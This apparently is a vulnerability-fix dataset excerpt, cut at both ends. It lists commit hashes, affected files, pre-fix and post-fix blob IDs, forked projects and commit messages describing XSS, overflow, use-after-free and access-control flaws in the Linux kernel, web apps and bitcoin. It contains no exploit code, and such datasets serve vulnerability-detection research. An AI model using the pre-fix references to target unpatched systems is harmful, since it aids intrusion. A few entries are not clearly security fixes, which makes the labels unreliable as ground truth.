0000000000000004  IP: [<ffffffff810be32c>] mem_cgroup_usage_unregister_event+0x9c/0x1f0  Pid: 574, comm: kworker/0:2 Not tainted 3.3.0-rc4+ #9 Bochs Bochs  RIP: 0010:[<ffffffff810be32c>]  [<ffffffff810be32c>] mem_cgroup_usage_unregister_event+0x9c/0x1f0  RSP: 0018:ffff88001d0b9d60  EFLAGS: 00010246  Process kworker/0:2 (pid: 574, threadinfo ffff88001d0b8000, task ffff88001de91cc0)  Call Trace:   [<ffffffff8107092b>] cgroup_event_remove+0x2b/0x60   [<ffffffff8103db94>] process_one_work+0x174/0x450   [<ffffffff8103e413>] worker_thread+0x123/0x2d0\n\nCc: stable <stable@vger.kernel.org> Signed-off-by: Anton Vorontsov <anton.vorontsov@linaro.org> Acked-by: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com> Cc: Kirill A. Shutemov <kirill@shutemov.name> Cc: Michal Hocko <mhocko@suse.cz> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    86073d532aed656550cb731aa5b4288b126ae7a6
File(s) In Commit: 
    js/replication.js
Blob(s) In Commit: 
    3ea119a97f8b81392a0043703b0039377355f43e
Blob(s) Before Fix: 
    1a7c785b03699babcd7e71ecc8d7a09af1e33660
Projects:
    007durgesh219_moodle
    007durgesh219_phpmyadmin
Commit Message for 86073d532aed656550cb731aa5b4288b126ae7a6:
Do not put database names as html

======================================================================
Commit With Fix: 
    a9986b86c53de0582248b39605660fbba0c21a29
File(s) In Commit: 
    frontend/core/engine/javascript.php
Blob(s) In Commit: 
    b25b0a138a75915d19eb0e2775c5dcbde51a2d98
Blob(s) Before Fix: 
    8de23787d3c12525d913a69055e7100d1768c768
Projects:
    80tasks_forkcms
Commit Message for a9986b86c53de0582248b39605660fbba0c21a29:
XSS / LFI Fox

======================================================================
Commit With Fix: 
    d0772b70faaf8e9f2013b6c4273d94d5eac8047a
File(s) In Commit: 
    net/ipv6/xfrm6_tunnel.c
Blob(s) In Commit: 
    5502cc948dfbb3ddb1a97bed03bd5d2320a8b891
Blob(s) Before Fix: 
    12e426b9aacd19d2b03e3d35bfc230dcd3c42897
    538499a8997506a2336ab10d0c7d457bcea5ae6c
    7ae52b35f4b3ef34c1e7a7323156bed85881dee8
    93c42232aa396f7c1ddafe5310674b2b7c72c542
    dff33ccea2388499070efcb81849b217f76bd703
    ee4b84a33ff41a63a22fd7cb628e5e2e382e737c
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for d0772b70faaf8e9f2013b6c4273d94d5eac8047a:
[IPV6]: Fix slab corruption running ip6sic\n\nFrom: Eric Sesterhenn <snakebyte@gmx.de>\n\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    dcdf4fd954e3213c355746fa15b7480461972308
File(s) In Commit: 
    taglib/toolkit/tbytevector.cpp
Blob(s) In Commit: 
    cb6a5a0fcf7f03b1f50e45bbf51ab04883bdba47
Blob(s) Before Fix: 
    5edbfbfe539c7d0816e45538917112a8350fbc6f
Projects:
    121340129_taglib
Commit Message for dcdf4fd954e3213c355746fa15b7480461972308:
Avoid uint overflow in case the length + index is over UINT_MAX

======================================================================
Commit With Fix: 
    58854564c7b8672090c25c4b1677d08620d870f2
File(s) In Commit: 
    classes/ezjscajaxcontent.php
Blob(s) In Commit: 
    97610b16491e4f58b82933b08b400c610a425b80
Blob(s) Before Fix: 
    bab1cf92e6f49416e7df49c13d6cb6aa12fd4b98
Projects:
    Adcaelo_ezpublish-legacy
Commit Message for 58854564c7b8672090c25c4b1677d08620d870f2:
Fixed #019245: XSS exploit on eZJSCore RUN command

======================================================================
Commit With Fix: 
    fe7dbd2c104c37f6f3af7d9f1646a3c332aea4a4
File(s) In Commit: 
    src/dns.cpp
Blob(s) In Commit: 
    2e1c751c4c496b635b4598c959d390f3edb0bc0a
Blob(s) Before Fix: 
    21b0d9e39f400134cded6218bed3355ce71f3d75
    945e1fb15c296577fce48a7c017fba18c0624f9d
Projects:
    0x277F_inspircd
Commit Message for fe7dbd2c104c37f6f3af7d9f1646a3c332aea4a4:
Merge pull request #1 from nenolod/insp20\n\nDNS resolver hardening (insp20 branch)

======================================================================
Commit With Fix: 
    a206b0ea12eb4606b93323268fc81a4f1f952531
File(s) In Commit: 
    src/main.cpp
Blob(s) In Commit: 
    20aa069a79310042e232b064762c254fde2a3f4f
Blob(s) Before Fix: 
    47f1090727f16d5ddbb7119ee9f5a2cb267a0b9c
    891dbed980233a59c8e688f31fd4d008c6073b44
    995195289f8cd0208a13317aba58a5ce78e56ebf
Projects:
    0-admin_bitcoin
Commit Message for a206b0ea12eb4606b93323268fc81a4f1f952531:
Do not allow overwriting unspent transactions (BIP 30)\n\nIntroduce the following network rule:  * a block is not valid if it contains a transaction whose hash    already exists in the block chain, unless all that transaction's    outputs were already spent before said block.\n\nWarning: this is effectively a network rule change, with potential risk for forking the block chain. Leaving this unfixed carries the same risk however, for attackers that can cause a reorganisation in part of the network.\n\nThanks to Russell O'Connor and Ben Reeves.

======================================================================
Commit With Fix: 
    7f8c788aa70db98ac904f37fa4197fcabb802942
File(s) In Commit: 
    horizon/static/horizon/js/horizon.js
Blob(s) In Commit: 
    c47364a34ac92af93dcc83d7842a947dc6f693a4
Blob(s) Before Fix: 
    8cf2be56c6fb86bebb4da62113acc61d3637070b
Projects:
    1149608162_devstack
Commit Message for 7f8c788aa70db98ac904f37fa4197fcabb802942:
html escape the console log in refresh\n\nfixes bug 977944\n\n(cherry picked from commit ab2e27522aaeb0268fcc121bd3eff5a4485f313c)\n\nChange-Id: Ic6135ebc58b6c45d6336f0833717086e43d7cccb

======================================================================
Commit With Fix: 
    d50f2ab6f050311dbf7b8f5501b25f0bf64a439b
File(s) In Commit: 
    fs/ext4/super.c
Blob(s) In Commit: 
    108c3af8617b534ef31ce81d65261f6e87bcbc35
Blob(s) Before Fix: 
    36570b7af7c5cc59d5ff559547a6bcef21cd97fb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d50f2ab6f050311dbf7b8f5501b25f0bf64a439b:
ext4: fix undefined behavior in ext4_fill_flex_info()\n\nCommit 503358ae01b70ce6909d19dd01287093f6b6271c ("ext4: avoid divide by zero when trying to mount a corrupted file system") fixes CVE-2009-4307 by performing a sanity check on s_log_groups_per_flex, since it can be set to a bogus value by an attacker.\n\n	sbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex  	groups_per_flex = 1 << sbi->s_log_groups_per_flex \n\n	if (groups_per_flex < 2) { ... }\n\nThis patch fixes two potential issues in the previous commit.\n\n1) The sanity check might only work on architectures like PowerPC. On x86, 5 bits are used for the shifting amount.  That means, given a large s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36 is essentially 1 << 4 = 16, rather than 0.  This will bypass the check, leaving s_log_groups_per_flex and groups_per_flex inconsistent.\n\n2) The sanity check relies on undefined behavior, i.e., oversized shift. A standard-confirming C compiler could rewrite the check in unexpected ways.  Consider the following equivalent form, assuming groups_per_flex is unsigned for simplicity.\n\n	groups_per_flex = 1 << sbi->s_log_groups_per_flex  	if (groups_per_flex == 0 || groups_per_flex == 1) {\n\nWe compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will completely optimize away the check groups_per_flex == 0, leaving the patched code as vulnerable as the original.  GCC keeps the check, but there is no guarantee that future versions will do the same.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    b92946e2919134ebe2a4083e4302236295ea2a73
File(s) In Commit: 
    drivers/net/macvtap.c
Blob(s) In Commit: 
    163559c16988329b57878b376d320a8ed8db5bfd
Blob(s) Before Fix: 
    0427c6561c84e8fbc08a179e05492f192a7976f1
    58dc117a8d781b93ba91a258fe87de1e3bf5a7c8
    a4ff694cea228c4d98289c5ab3dde2f7d430005b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b92946e2919134ebe2a4083e4302236295ea2a73:
macvtap: zerocopy: validate vectors before building skb\n\nThere're several reasons that the vectors need to be validated:\n\n- Return error when caller provides vectors whose num is greater than UIO_MAXIOV. - Linearize part of skb when userspace provides vectors grater than MAX_SKB_FRAGS. - Return error when userspace provides vectors whose total length may exceed - MAX_SKB_FRAGS * PAGE_SIZE.\n\nSigned-off-by: Jason Wang <jasowang@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com>

======================================================================
Commit With Fix: 
    d52fc5dde171f030170a6cb78034d166b13c9445
File(s) In Commit: 
    security/commoncap.c
Blob(s) In Commit: 
    0ecf4ba321cbeaa812dadc6524e138bc40b866b3
Blob(s) Before Fix: 
    0cf4b53480a778ffeacd46149aa785c63db81c07
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d52fc5dde171f030170a6cb78034d166b13c9445:
fcaps: clear the same personality flags as suid when fcaps are used\n\nIf a process increases permissions using fcaps all of the dangerous personality flags which are cleared for suid apps should also be cleared. Thus programs given priviledge with fcaps will continue to have address space randomization enabled even if the parent tried to disable it to make it easier to attack.\n\nSigned-off-by: Eric Paris <eparis@redhat.com> Reviewed-by: Serge Hallyn <serge.hallyn@canonical.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    905ad269c55fc62bee3da29f7b1d1efeba8aa1e1
File(s) In Commit: 
    fs/proc/root.c
Blob(s) In Commit: 
    03102d978180eba68469ef01d13ad25465f5b796
Blob(s) Before Fix: 
    1421d66a695fd1f878011088f19284e5fff72563
    46a15d8a29ca74d9ca0a68a57e416108e6b599f3
    4ae347e80ed71facbf07da1e66018f8bea632705
    757c069f2a65132584272d3fc1ccd22ea012d737
    9a8a2b77b87479621838ee00c928a43edbe938e9
    a9000e9cfee54ac804eb71e75d0b72bf989041ed
    b080b791d9e313b580882a0163de92fbb22886b9
    d16ee0f89f5c61d7cd4c561f4a4c0da043e7ddf1
    d6c3b416529b9709f2db526be706dbb415902ea3
    ef9fa8e24ad65f9b13a2a4cb989a14466ac3db8b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 905ad269c55fc62bee3da29f7b1d1efeba8aa1e1:
procfs: fix a vfsmount longterm reference leak\n\nkern_mount() doesn't pair with plain mntput()...\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    ff71173477e54774b5571015d49d944f51cb8a26
File(s) In Commit: 
    inc/html.php
Blob(s) In Commit: 
    022cd792a800cbc03d8866a6a757455592abb2eb
Blob(s) Before Fix: 
    b233e1d92633fb07b1de5ba3722ffd774e2bf145
Projects:
    122800_dokuwiki
Commit Message for ff71173477e54774b5571015d49d944f51cb8a26:
escape target error message (SECURITY) FS#2487 FS#2488\n\nThe error message when a non-existant editor was tried to load wasn't escaped correctly, allowing to introduce arbitrary JavaScript to the output, leading to a XSS vulnerability.\n\nNote: the reported second XCRF vulnerability is the same bug, the xploit code simply uses JavaScript to extract a valid CSRF token from the site

======================================================================
Commit With Fix: 
    cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc
File(s) In Commit: 
    net/core/sock.c
Blob(s) In Commit: 
    9e5b71fda6ec0d726bd356bce1658f55091ebcf8
Blob(s) Before Fix: 
    02f8dfe320b771ee96ba3bb5bae52b2974608bd8
    0f8402ea434b134694584c0482ce04ba2bf0d756
    26ed27fb2bfb87f55300c220599c03ddf754d8bf
    561eb57f590c2df21480cb53d44bdb2f15438409
    5efcd6307fa7a9c5a44bf200c068af7213b7aa5a
    653f8c0aedc54aafb08c6f451157f7ca7e432efa
    6e819780c23252b3387c1b2daec25a261fa1f2fb
    742cbfb520c78f1005900fadb052fa4eb69abb89
    76ff58d43e261c34e630034571d7c48f34d16ffc
    832cf043a8f74aa31087452b4b9949a16b937bef
    9be6d0d6c5335e0f14ad61a26c1837e5b693e648
    aebb419519b38163f1b60ef613ce6388692ac3d4
    b23f174ab84c3b6c72302834d8e13695d22a1c6c
    b2e14c07d9205467f0a8d83af3fe6108d277a15f
    bc745d00ea4dd31177445dcc4282afd669a33cb6
    c5f765ccb4ab520f56042996e89669439006637b
    f372d9bf497675a436aa2cbc7cba00b5464faf9b
    f7e3ba8d0f87eb504b31398f41fc4b4a83f83b58
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc:
net: sock: validate data_len before allocating skb in sock_alloc_send_pskb()\n\nWe need to validate the number of pages consumed by data_len, otherwise frags array could be overflowed by userspace. So this patch validate data_len and return -EMSGSIZE when data_len may occupies more frags than MAX_SKB_FRAGS.\n\nSigned-off-by: Jason Wang <jasowang@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    20e0fa98b751facf9a1101edaefbc19c82616a68
File(s) In Commit: 
    fs/nfs/nfs4proc.c
Blob(s) In Commit: 
    45df7d4a3acc1f92e18822b5285eb9d603ebe52b
Blob(s) Before Fix: 
    e809d2305ebf3a6431c52a6f0a805672365557fb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 20e0fa98b751facf9a1101edaefbc19c82616a68:
Fix length of buffer copied in __nfs4_get_acl_uncached\n\n_copy_from_pages() used to copy data from the temporary buffer to the user passed buffer is passed the wrong size parameter when copying data. res.acl_len contains both the bitmap and acl lenghts while acl_len contains the acl length after adjusting for the bitmap size.\n\nSigned-off-by: Sachin Prabhu <sprabhu@redhat.com> Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>

======================================================================
Commit With Fix: 
    ed8cd3b2cd61004cab85380c52b1817aca1ca49b
File(s) In Commit: 
    drivers/gpu/drm/i915/i915_gem_execbuffer.c
Blob(s) In Commit: 
    7c50e58175c027c6326081243ca3533f477fa612
Blob(s) Before Fix: 
    f51a696486cb19f06822f84a10f4a6911c1bd7d8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ed8cd3b2cd61004cab85380c52b1817aca1ca49b:
drm/i915: fix integer overflow in i915_gem_execbuffer2()\n\nOn 32-bit systems, a large args->buffer_count from userspace via ioctl may overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 8408c282 ("drm/i915: First try a normal large kmalloc for the temporary exec buffers").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com> Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk> Cc: stable@vger.kernel.org Signed-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>

======================================================================
Commit With Fix: 
    44afb3a04391a74309d16180d1e4f8386fdfa745
File(s) In Commit: 
    drivers/gpu/drm/i915/i915_gem_execbuffer.c
Blob(s) In Commit: 
    de431942ded4bb5a7b6f5a380e6009cd6b22b696
Blob(s) Before Fix: 
    02adcaf6ebea69086aa07be57fed55b347636c94
    0c400f852a76861e6b2cf11497a19f2658bba072
    117ce38136812d1689ecc4b65ffe743a5e86a71c
    1ca53ffac6a2183542aac42c3ac7ad1ba61a1974
    20a4cc5b818f51632ad50a94bdfa4092c3f1a454
    397884e9f5078e42a035818bd0debb6cec6a1790
    41d3a28c80016e573fbea2e9be60420d5ee262dd
    43cad70fe1adeef88b91d6ab08423cd1bc078a74
    490ab6b17cfb3744366156a67b9104670a394501
    4934cf84c320336aa84320da544cc1e0d091da1c
    6416d0d07394cee9cdee799463174a025a9d590d
    65e1f0043f9df5564d63eb8e95d413f7b5f01513
    6727aa06bb65ba1f089032ed86484c081ac19170
    7a682e7d5e2c7f6a6b493a80c67019a70bec34de
    7c50e58175c027c6326081243ca3533f477fa612
    81687af00893ca5c20edfe2256dd5b98da7fdf45
    87b108df17b9ac5c60a9b1a7e4208daae1e44ae4
    91075afb41b2f944799a984b863fc0dfd829b7f9
    a14c4cc4ffc6517e46e315bd4d3abcc4858574cc
    a6c2f7aa176b87475768205d4d266a694d8818b8
    b9da8900ae4eaef10c12f2d68da79a226f9f3260
    bc927ae3164f6e01c7e1d2adf782fdca1f796f9c
    c681dc149d2a121fe55354143f50465d6b0b75d6
    d4417e3cc3da22ab28f562e7a02aa948d0ec2c5f
    e159e33c9b6a0c52deea86df6a9e41e77401f731
    e97ed611d8c0a162a7204f2f4bbcdd9f55c3531a
    f51a696486cb19f06822f84a10f4a6911c1bd7d8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 44afb3a04391a74309d16180d1e4f8386fdfa745:
drm/i915: fix integer overflow in i915_gem_do_execbuffer()\n\nOn 32-bit systems, a large args->num_cliprects from userspace via ioctl may overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 432e58ed ("drm/i915: Avoid allocation for execbuffer object list").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com> Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk> Cc: stable@vger.kernel.org Signed-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>

======================================================================
Commit With Fix: 
    c50ac050811d6485616a193eb0f37bfbd191cc89
File(s) In Commit: 
    mm/hugetlb.c
Blob(s) In Commit: 
    285a81e87ec853cef3c5c1a20400bfb35415a04b
Blob(s) Before Fix: 
    41a647dfb738123023d56bc0174ba2477a0b0ea0
    4e28416c47fb5a299ff2bab6ae94afd05e802730
    ae8f708e3d75acd9c64f495ea74b8f1cb5ecc2c3
    d7c6cc51d589853817f2e5c86227e80b7af3ff38
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c50ac050811d6485616a193eb0f37bfbd191cc89:
hugetlb: fix resv_map leak in error path\n\nWhen called for anonymous (non-shared) mappings, hugetlb_reserve_pages() does a resv_map_alloc().  It depends on code in hugetlbfs's vm_ops->close() to release that allocation.\n\nHowever, in the mmap() failure path, we do a plain unmap_region() without the remove_vma() which actually calls vm_ops->close().\n\nThis is a decent fix.  This leak could get reintroduced if new code (say, after hugetlb_reserve_pages() in hugetlbfs_file_mmap()) decides to return an error.  But, I think it would have to unroll the reservation anyway.\n\nChristoph's test case:\n\n	http://marc.info/?l=linux-mm&m=133728900729735\n\nThis patch applies to 3.4 and later.  A version for earlier kernels is at https://lkml.org/lkml/2012/5/22/418.\n\nSigned-off-by: Dave Hansen <dave@linux.vnet.ibm.com> Acked-by: Mel Gorman <mel@csn.ul.ie> Acked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Reported-by: Christoph Lameter <cl@linux.com> Tested-by: Christoph Lameter <cl@linux.com> Cc: Andrea Arcangeli <aarcange@redhat.com> Cc: <stable@vger.kernel.org>	[2.6.32+] Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    bcc2c9c3fff859e0eb019fe6fec26f9b8eba795c
File(s) In Commit: 
    tools/hv/hv_kvp_daemon.c
Blob(s) In Commit: 
    d9834b36294373f88d29731350ccc9d384b41788
Blob(s) Before Fix: 
    11224eddcdc22ebcb40e20d77774e2a1834cb8fb
    146fd6147e84be5cde2a66009f331f1b6ee2b805
    2984ffb7bac7aa0bae79b5330320915640370820
    60a8e29c4faef75714d4431b6334ccf26b760e7b
    6fc12d561e486dbdd4400b5f53c6575c3569d691
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for bcc2c9c3fff859e0eb019fe6fec26f9b8eba795c:
Tools: hv: verify origin of netlink connector message\n\nThe SuSE security team suggested to use recvfrom instead of recv to be certain that the connector message is originated from kernel.\n\nCVE-2012-2669\n\nSigned-off-by: Olaf Hering <olaf@aepfle.de> Signed-off-by: Marcus Meissner <meissner@suse.de> Signed-off-by: Sebastian Krahmer <krahmer@suse.de> Signed-off-by: K. Y. Srinivasan <kys@microsoft.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    7f5aa4f35e23fd37425b3a5041737cdf58f87385
File(s) In Commit: 
    libc/bionic/malloc_debug_leak.c
Blob(s) In Commit: 
    e5845023d4e993b19f9d4ae65922a458d77350d4
Blob(s) Before Fix: 
    e0bcee946c1c3f3213010ed5e9fa058740f552c6
Projects:
    0-T-0_ps4-linux
    0-kaladin_build
    0-kaladin_system_core
    00day0_android_frameworks_base
Commit Message for 7f5aa4f35e23fd37425b3a5041737cdf58f87385:
bionic: fix integer overflows in chk_malloc(), leak_malloc(), and leak_memalign()\n\nThe allocation size in chk_malloc(), leak_malloc(), and leak_memalign() functions may be rounded up to a small value, leading to buffer overflows. The code only runs in debugging mode.\n\nThis patch complements commit 6f04a0f4 (CVE-2009-0607).\n\nChange-Id: Id899bcd2bcd2ea2205e5753c433390710032dc83 Signed-off-by: Xi Wang <xi.wang@gmail.com>

======================================================================
Commit With Fix: 
    9e2dcf72023d1447f09c47d77c99b0c49659e5ce
File(s) In Commit: 
    net/ipv6/netfilter/nf_conntrack_reasm.c
Blob(s) In Commit: 
    f1171b744650e07f1e979a9575e5792ebaa10a9b
Blob(s) Before Fix: 
    058a5e4a60c37e743c6dc001bcf603dc05474c82
    312c20adc83f4fe93469010c511acf6b82aa42d2
    624a54832a7caa13a5f7fabf9e373e256772db53
    6e96fa5f5ddfef43b1fdb4bb3c60b262ac09d125
    ad1fcda6898bae7913923a4d06a7245dde468939
    e0b9424fa1b2b3457cc99051b49c22105f5f3aff
    f3aba255ad9f21aed45d85295fa3e7542c526078
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 9e2dcf72023d1447f09c47d77c99b0c49659e5ce:
netfilter: nf_conntrack_reasm: properly handle packets fragmented into a single fragment\n\nWhen an ICMPV6_PKT_TOOBIG message is received with a MTU below 1280, all further packets include a fragment header.\n\nUnlike regular defragmentation, conntrack also needs to "reassemble" those fragments in order to obtain a packet without the fragment header for connection tracking. Currently nf_conntrack_reasm checks whether a fragment has either IP6_MF set or an offset != 0, which makes it ignore those fragments.\n\nRemove the invalid check and make reassembly handle fragment queues containing only a single fragment.\n\nReported-and-tested-by: Ulrich Weber <uweber@astaro.com> Signed-off-by: Patrick McHardy <kaber@trash.net>

======================================================================
Commit With Fix: 
    79549c6dfda0603dba9a70a53467ce62d9335c33
File(s) In Commit: 
    kernel/cred.c
Blob(s) In Commit: 
    e70683d9ec32f00bf58a0ea2dc64be2d74fb8415
Blob(s) Before Fix: 
    174fa84eca303ced39cc03910114d495f7b777b0
    1ed8ca18790c1e937208af47bed6695f4218858b
    27761b685660f74513170e297384c1be6739cc07
    3a55ea4fa983ebf7259e55ae659dc583b247343a
    3a9d6dd53a6cd79696fe88784d27fe3c07c27aaf
    444230ee51ab79b418dc7fcf7b8bbcc62295f29a
    45d77284aed0a91383e71e53bfadf6dd5017f7e0
    48c6fd3bc848a689979e9d62d8b7483c45c0bb66
    5557b55048df1a35fff09933a274c9a5e32b7084
    5791612a404503aa95bd708fcc9d6928d85327a6
    5f264fb5737dcd01329fdeff02a4143584ba9c38
    79320751d349ec9bbf946a75bfd8ce301bac401f
    7a1b4774aabf5064c35338026bc9d9758a89c2d1
    815c0d53252a1b626f0788623fd80197b9391f92
    8ef31f53c44c9aa8e74d3b15649fdf7d246a2a36
    95707360c0bc23cdc2d22680db11f3fc04e2ee4a
    97b36eeca4c90b51cf9fa0abcd81af72e1dfb715
    9a3e22641fe736c5d97b8c1f1f8b321886b4bcad
    9c06d10107c4390bac4d71cc8b9c5580413d05ae
    a413ebdd2225b21e6aa219df3d0355e6156f0131
    dd76cfe5f5b038dbd4fe804a5bfbd6663dd634ce
    e0573a43c7df62b1b37df319bd74ff377603ccf5
    ed884ddf6d07283024f90738285f89d5e7fb5c0a
    f733cdf16ebd4ecb020779fb7c2045cf711ef969
    fed7c3fd94771eed0de4243a1dfd8f486316912b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 79549c6dfda0603dba9a70a53467ce62d9335c33:
cred: copy_process() should clear child->replacement_session_keyring\n\nkeyctl_session_to_parent(task) sets ->replacement_session_keyring, it should be processed and cleared by key_replace_session_keyring().\n\nHowever, this task can fork before it notices TIF_NOTIFY_RESUME and the new child gets the bogus ->replacement_session_keyring copied by dup_task_struct(). This is obviously wrong and, if nothing else, this leads to put_cred(already_freed_cred).\n\nchange copy_creds() to clear this member. If copy_process() fails before this point the wrong ->replacement_session_keyring doesn't matter, exit_creds() won't be called.\n\nCc: <stable@vger.kernel.org> Signed-off-by: Oleg Nesterov <oleg@redhat.com> Acked-by: David Howells <dhowells@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80
File(s) In Commit: 
    file/edit_html.cgi
Blob(s) In Commit: 
    c249bea1e0cbafa105b632d9e1f19e6334ae0ad1
Blob(s) Before Fix: 
    40b81f7a7283e63e49c851207ba0ce5fb88ad73c
Projects:
    Anialation81_webmin
Commit Message for 4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80:
Add access control check when reading HTML file https://sourceforge.net/tracker/index.php?func=detail&aid=3542038&group_id=17457&atid=117457#

======================================================================
Commit With Fix: 
    67de956ff5dc1d4f321e16cfbd63f5be3b691b43
File(s) In Commit: 
    net/nfc/nci/ntf.c
Blob(s) In Commit: 
    2ab196a9f228ac873238c2a060685bacea62b87a
Blob(s) Before Fix: 
    2e3dee42196d064d0fdcf5ad7c6e4fe50945d57b
    96633f5cda4f790d3bae4ecdfa4f3a6435c5797c
    b16a8dc2afbe7fcd457787791f887092985021e5
    b444ec9d05a1ed3e14365883809e670df9065c6e
    cb2646179e5f8b8d1836499579d1ccfd109fad60
    e460cf13c56e27e35647edec5cde24dc5a172aeb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 67de956ff5dc1d4f321e16cfbd63f5be3b691b43:
NFC: Prevent multiple buffer overflows in NCI\n\nFix multiple remotely-exploitable stack-based buffer overflows due to the NCI code pulling length fields directly from incoming frames and copying too much data into statically-sized arrays.\n\nSigned-off-by: Dan Rosenberg <dan.j.rosenberg@gmail.com> Cc: stable@kernel.org Cc: security@kernel.org Cc: Lauro Ramos Venancio <lauro.venancio@openbossa.org> Cc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org> Cc: Samuel Ortiz <sameo@linux.intel.com> Cc: David S. Miller <davem@davemloft.net> Acked-by: Ilan Elias <ilane@ti.com> Signed-off-by: Samuel Ortiz <sameo@linux.intel.com>

======================================================================
Commit With Fix: 
    a524967e8d5c4c22e49cd619aed20c87a316c0be
File(s) In Commit: 
    src/lib/Server/Plugins/Trigger.py
Blob(s) In Commit: 
    b173031fe9cf3dc7b7a619c3a46001335f05314e
Blob(s) Before Fix: 
    eb3310a4e01b3786ce999c96946fa48f995bc6fd
Projects:
    0_bcfg2
Commit Message for a524967e8d5c4c22e49cd619aed20c87a316c0be:
fixed major security flaw in Trigger plugin

======================================================================
Commit With Fix: 
    034762e8060dcf0a11cb039b9d426b0d0bb1801d
File(s) In Commit: 
    nova/scheduler/filters/affinity_filter.py
Blob(s) In Commit: 
    03bf0dd6eeed24a74dd67444e12bf6c4a29e9152
Blob(s) Before Fix: 
    b4e1a30340a3b0ff4af2a89977b3b63c62714935
    e2a38b1e63e0ede6ae2659ec579abbb8c65c97e5
    e6e7a116af245555ec9e4c87c666a9ae913724ae
Projects:
    2020human_nova
Commit Message for 034762e8060dcf0a11cb039b9d426b0d0bb1801d:
Use compute_api.get_all in affinity filters.\n\nUpdates the affinity filters so they make a single compute API call to lookup instance host information rather than single lookups for each UUID.\n\nThis resolves a potential performance issue which can cause a scheduler to hang while processing requests which contain large numbers of UUID's in the scheduler_hints.\n\nFixes LP Bug #1017795.\n\nChange-Id: I30f434faf109058573ee41c4a6abce2e48939e8d

======================================================================
Commit With Fix: 
    13d518074a952d33d47c428419693f63389547e9
File(s) In Commit: 
    fs/eventpoll.c
Blob(s) In Commit: 
    c0b3c70ee87a2b8e0e46c01a87d63ac692aecc71
Blob(s) Before Fix: 
    04849f7f3752dc15b7ca07e0821f09c4c5801a4f
    05b966cd6f7696144268d5cac92e30bea3f89c34
    079d1be65ba9e61e6f0452ecffc0cd23a6c3987d
    085c5c063420d3dca2153f70ca5d3dfaf48a1962
    288fe6e3e0448bea757a8b348f171b1a2e10c31c
    29b6f84b87e85a83481433ddbda7b076ec393d65
    2acaf60f4e4da47cc07e8a09d09cae82dde0a23e
    2cf0f2153be57ddcf6bc782d1f15fa5d2386d8a7
    2d1744ab5bcb473f52112ad70df17603dc6b96f0
    32e9964e6526b6dea8119cfa4671d40722c2338f
    33c9599c14e7332823f045a74b2e71583195fa96
    35a1a614bfdd6f6ffe43dce6d7378e850e5e362a
    35a852a2682f5c9e4625f2feff3f7996e13f6bfa
    3817149919cb81fa298686f183f67e0c86fe1c50
    39a2364417b76642f70ff02ae1e9478fd414013b
    46e0b103eea88a384b75c615f219dc720c1273eb
    497accdb2dbbc2d8a77c5a906307f1eea7319bd8
    4a0e98d87fcca90fcd06deb5d64ac6dd1f0f2ed9
    4d9d3a45e35647a19d9182e28422c397f654abb5
    739b0985b398ea2d837af83e26fa305a6cdfdc30
    828e750af23a7923cb9782c9cd3c3b87ed6b4964
    9613d8fa229cbacde48a2d63e0fef60f43432951
    9d39c24e892fdfd2e4f9c85820aefa3e56ead84c
    9dba98a0b31f3691bc11211bc6b740be71f86a5b
    aabdfc38cf2499817f150eace1efe8e8f08f1f8f
    b163f891bc3764ffc683fe7c233ff1c106680ab2
    bd056a5b4efc59ceccb8b121100d40e2bb16cf3f
    ca300071e79c1c1abcd3eb3f58fc8f24ea558dc0
